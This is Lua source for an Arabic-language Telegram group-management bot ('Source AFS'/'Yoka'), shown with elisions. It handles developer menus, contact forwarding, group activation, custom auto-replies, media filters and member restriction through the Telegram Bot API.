local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بتحديث  سورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
{'↫ تحديث السورس ☆','↫ تحديث ☆'},
{'↫ السيرفر ☆'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه ب أحصائيات  سورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
{'↫  الاحصائيات ☆'},
{'↫ المشتركين ☆','↫ المجموعات ☆'},
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه ب المطورين لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه ب التفعيل والتعطيل لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بالاذاعه لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
{'↫ اذاعه بالتثبيت ☆'},
{'↫ اذاعه خاص ☆','↫ اذاعه عام ☆'},
...
if text == '↫ العام ☆' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بالعام لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بردود الخاص لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if SecondSudo(msg) then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي المطور \n☆︙ هاك ضلعي  الازرار الخاصه بالاشتراك الاجباري لسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي \n☆︙ هاك ضلعي  الازرار الخاصه بالاوامر الخدميه الخاصه بسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي \n☆︙ هاك ضلعي  الازرار الخاصه بأوامر التسليه الخاصه بسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
{'↫ غنيلي ☆','↫ اغنيه ☆'},
{'↫ ميمز ☆','↫ ريمكس ☆'},
{'↫ صوره ☆','↫ متحركه ☆'},
...
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي \n☆︙ هاك ضلعي  الازرار الخاصه بأوامر النسب الخاصه بسورس يوكا فقط دوس على الامر الذي تريد تنفيذه'
local key = {
...
if text == '↫ العاب ☆' then 
local Sudo_Welcome = '☆︙ها هلو مجددا عزيزي \n☆︙ هاك ضلعي  الازرار الخاصه بألعاب سورس يوكا فقط دوس على اللعبه الذي تريد لعبها'
local key = {
...
if not DevALS:get(AFS..'ALS:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp)
tdcli_function({ID="GetUser",user_id_=AFS},function(arg,dpbot)
local inline = {
...
local start = DevALS:get(AFS.."ALS:Start:Bot")
if start then 
Start_Source = start
else
...
DevALS:setex(AFS..'ALS:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source AFS     --
if not SecondSudo(msg) and not DevALS:sismember(AFS..'ALS:Ban:Pv',msg.sender_user_id_) and not DevALS:get(AFS..'ALS:Texting:Pv') then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,chat) 
Dev_ALS(msg.sender_user_id_, msg.id_, 1, '☆︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CXRCX")..')', 1, 'md') 
...
DevALS:sadd(AFS..'ALS:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '☆︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n☆︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevALS:srem(AFS..'ALS:Ban:Pv',data.id_)  
return false  
end 
...
--     Source AFS     --
if text and DevALS:get(AFS..'ALS:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevALS:del(AFS..'ALS:Start:Bots'..msg.sender_user_id_) 
return false
end
DevALS:set(AFS.."ALS:Start:Bot",text)  
...
DevALS:set(AFS..'ALS:Start:Bots'..msg.sender_user_id_,true) 
...
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل التواصل بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(AFS..'ALS:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ☆' and ChCheck(msg) then  
local AFSTeam = '☆︙ها هلو ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل التواصل بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, AFSTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(AFS..'ALS:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevALS:del(AFS.."ALS:Lock:AutoFile")
end
...
DevALS:set(AFS.."ALS:Lock:AutoFile",true) 
end
end
end
--     Source AFS     --
...
if text == "الحمايه" or text == "↫ الحمايه ☆" then  Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙ اضف البوت في الكروب ثم قم برفعه مشرف وارسل تفعيل \n☆︙ وتمتع بخدمات غير موجوده في باقي البوتات ', 1, 'md') end
...
if text == "يوتيوب" and ChCheck(msg) or text == "اليوتيوب" and ChCheck(msg) or text == "↫ بوت اليوتيوب ☆" and ChCheck(msg) or text == "بوت اليوتيوب" and ChCheck(msg) or text == "اريد بوت يوتيوب" and ChCheck(msg) or text == "شمرلي بوت يوتيوب" and ChCheck(msg) or text == "يوت" and ChCheck(msg) then local inline = {{{text="‹ دوس هنا ›",url="https://t.me/XiXbbot"}}} SendInline(msg.chat_id_,'*☆︙دوس للحصول على بوت اليوتيوب*',nil,inline,msg.id_/2097152/0.5) return false end
...
local AFSTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_ALS(msg.chat_id_, msg.id_, 1, ''..AFSTeam[math.random(#AFSTeam)]..'' , 1, 'md')  
return false
end
--     Source AFS     --
...
local DevText = DevALS:get(AFS.."DevText")
if DevALS:get(AFS.."ALS:ChId") then DevCh = '\n☆︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
if DevText then
...
local my_ph = DevALS:get(AFS.."ALS:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevALS:get(AFS..'ALS:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*☆︙قائمه الالعاب المتطوره دوس للعب*
]]
keyboard = {} 
...
if dp.id_ then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙الكروب ↫ ["..dp.title_.."]\n☆︙تمت المغادره منها بنجاح", 1, "md")
Dev_ALS(Text[2], 0, 1, "☆︙بامر المطور تم مغادرة هذه الكروب ", 1, "md")  
ChatLeave(dp.id_, AFS)
DevALS:srem(AFS.."ALS:Groups", dp.id_)
else
...
DevALS:incr(AFS..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:set(AFS.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevALS:get(AFS.."ALS:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevALS:sadd(AFS..'ALS:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(AFS) then 
DevALS:srem(AFS.."ALS:Groups", msg.chat_id_) 
...
SendText(DevId,"☆︙تم طرد البوت من الكروب ↫ ⤈ \n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n☆︙بواسطة ↫ "..Name.."\n☆︙اسم الكروب ↫ ["..NameChat.."]\n☆︙ايدي الكروب ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n┉ ┉ ┉ ʙᴀᴅ┉ ┉ ┉ ┉\n☆︙الوقت ↫ "..os.date("%I:%M%p").."\n☆︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevALS:get(AFS..'ALS:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevALS:incr(AFS..'ALS:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevALS:incr(AFS..'ALS:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source AFS     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevALS:get(AFS..'ALS:Lock:FreeBot'..AFS) then
if ChatType == 'pv' then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙لاتستطيع تفعيلي هنا يرجى اضافتي في مجموعه اولا', 1, 'md')
return false
end
if ChatType ~= 'sp' then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الكروب عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل الكروب ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
...
for i=0 , #admins do
if ALS.members_[i].bot_info_ == false and ALS.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevALS:sadd(AFS..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(AFS..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevALS:sadd(AFS..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
...
if ALS.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevALS:sadd(AFS.."ALS:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevALS:sadd(AFS.."ALS:ALSConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(AFS.."ALS:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevALS:srem(AFS.."ALS:ALSConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevALS:sismember(AFS..'ALS:Groups',msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙ هاه ايي والله مشتغل اني مفعله ضلعي', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevALS:get(AFS..'ALS:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عدد اعضاء الكروب اقل من ↫ *'..(DevALS:get(AFS..'ALS:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","☆︙تم تفعيل الكروب "..dp.title_)  
DevALS:sadd(AFS.."ALS:Groups",msg.chat_id_)
DevALS:sadd(AFS..'ALS:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevALS:set(AFS.."ALS:Groups:Links"..msg.chat_id_,LinkGroup) 
...
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙لا تستطيع تفعيل هذه الكروب بسبب تعطيل البوت الخدمي من قبل المطور الاساسي', 1, 'md') 
end 
end 
--     Source AFS     --
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
DevALS:set(AFS..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source AFS     --
local ReFalse = tostring(msg.chat_id_)
if not DevALS:sismember(AFS.."ALS:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevALS:get(AFS..'ALS:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevALS:sadd(AFS..'ALS:Tkeed:'..msg.chat_id_, dp.id_)
local Text = '☆︙ها هلو ↫ ['..string.sub(dp.first_name_,0, 40)..'](tg://user?id='..dp.id_..')\n☆︙يجب علينا التأكد أنك لست روبوت\n☆︙تم تقيدك دوس الزر بالاسفل لفكه'
keyboard = {} 
keyboard.inline_keyboard = {{{text="دوس هنا لفك تقيدك",callback_data="/UnTkeed"}}} 
Msg_id = msg.id_/2097152/0.5
HTTPS.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
return false
end
if DevALS:get(AFS.."ALS:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevALS:smembers(AFS.."ALS:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevALS:smembers(AFS.."ALS:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevALS:smembers(AFS.."ALS:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevALS:get(AFS..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevALS:del(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(AFS..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'ALS:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevALS:get(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:del(AFS..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevALS:get(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevALS:del(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
DevALS:del(AFS.."ALS:Gif:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Voice:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Audio:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Photo:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Stecker:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Video:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:File:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Text:AllRed"..msg.content_.text_)
DevALS:del(AFS.."ALS:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source AFS     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevALS:get(AFS..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevALS:smembers(AFS..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙☆︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevALS:del(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevALS:del(AFS..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevALS:sadd(AFS..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevALS:get(AFS..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevALS:sismember(AFS..'ALS:Manager:GpRedod'..msg.chat_id_,text) then
local AFSTeam =  DevALS:smembers(AFS..'ALS:Text:GpTexts'..text..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '['..AFSTeam[math.random(#AFSTeam)]..']' , 1, 'md')  
end
end
--     Source AFS     --
if text and text:match("^(.*)$") then
local SaveKt = DevALS:get(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SaveKt == 'SaveKt' then
local GetKtTexts = DevALS:get(AFS..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevALS:smembers(AFS..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙☆︙تم الغاء عملية حفظ اسئلة الكت  ↫ "..GetKtTexts ,  1, "md")
DevALS:del(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_)
DevALS:del(AFS..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(AFS..'ALS:Sudo:Kt'..msg.chat_id_,GetKtTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevALS:sadd(AFS..'ALS:Text:KtTexts'..GetKtTexts..msg.chat_id_,Text)
if #List == 100 then 
...
if text and not DevALS:get(AFS..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_) then
if DevALS:sismember(AFS..'ALS:Sudo:Kt'..msg.chat_id_,text) then
local DavidTeam =  DevALS:smembers(AFS..'ALS:Text:KtTexts'..text..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, '['..DavidTeam[math.random(#DavidTeam)]..']' , 1, 'md')  
end
end
--     Source AFS     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevALS:get(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevALS:get(AFS..'DelManagerRep'..msg.chat_id_)
DevALS:srem(AFS..'ALS:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ الرد', 1, 'md')
DevALS:del(AFS..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevALS:del(AFS..'DelManagerRep'..msg.chat_id_)
return false
end
DevALS:del(AFS..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevALS:get(AFS..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevALS:set(AFS..'ALS:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevALS:set(AFS..'ALS:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevALS:set(AFS..'ALS:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevALS:set(AFS..'ALS:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevALS:set(AFS..'ALS:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevALS:set(AFS..'ALS:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevALS:set(AFS..'ALS:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevALS:set(AFS..'ALS:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevALS:get(AFS..'ALS:Lock:GpRed'..msg.chat_id_) then 
if DevALS:get(AFS..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS..'ALS:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(AFS..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS..'ALS:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(AFS..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS..'ALS:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(AFS..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS..'ALS:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(AFS..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS..'ALS:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevALS:get(AFS..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevALS:get(AFS..'ALS:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevALS:get(AFS..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevALS:get(AFS..'ALS:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevALS:get(AFS..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function AFSTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'ماكو' end
local edit_msg = DevALS:get(AFS..'ALS:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevALS:get(AFS..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevALS:get(AFS..'ALS:Text:GpRed'..msg.content_.text_..msg.chat_id_)
local Text = Text:gsub('#username',(username or 'ماكو')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'ماكو'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'ماكو'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, AFSTeam)
end
end
--     Source AFS     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevALS:get(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevALS:get(AFS..'DelSudoRep')
DevALS:del(AFS.."ALS:Sudo:AllRed",DelSudoRep)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ الرد', 1, 'md')
DevALS:del(AFS.."ALS:Add:AllText"..msg.sender_user_id_)
DevALS:del(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
DevALS:del(AFS.."DelSudoRep")
return false
end
DevALS:del(AFS.."ALS:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevALS:get(AFS.."ALS:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevALS:set(AFS.."ALS:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevALS:set(AFS.."ALS:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevALS:set(AFS.."ALS:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevALS:set(AFS.."ALS:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevALS:set(AFS.."ALS:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevALS:set(AFS.."ALS:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevALS:set(AFS.."ALS:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevALS:set(AFS.."ALS:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم حفظ الرد الجديد', 1, 'md') 
DevALS:del(AFS.."ALS:Add:AllText"..msg.sender_user_id_)
DevALS:del(AFS..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevALS:get(AFS..'ALS:Lock:AllRed'..msg.chat_id_) then
if DevALS:get(AFS.."ALS:Video:AllRed"..msg.content_.text_) then
